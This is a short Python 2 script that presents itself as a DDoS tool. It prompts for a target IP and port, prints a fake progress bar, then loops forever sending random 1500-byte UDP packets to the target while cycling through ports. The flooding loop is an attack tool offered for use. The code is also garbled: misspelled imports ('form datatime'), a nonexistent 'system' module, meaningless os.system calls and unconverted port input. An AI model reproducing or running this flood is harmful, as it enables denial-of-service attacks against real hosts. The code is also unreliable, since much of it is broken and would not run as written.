import sys
import os
import time
import socket
import random
import system

#TIME
form datatime import datatime
now = datatime.now()
hour = now.hour()
minute = now.minute()
day = now.day()
month = now.month()
year = now.year()



#############################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1500)
#############################

os.system("DDos")

ip = raw_input("IP :")
port = raw_input("PORT :")

os.system("!ATTACK!")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
print "[========successful===========]"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
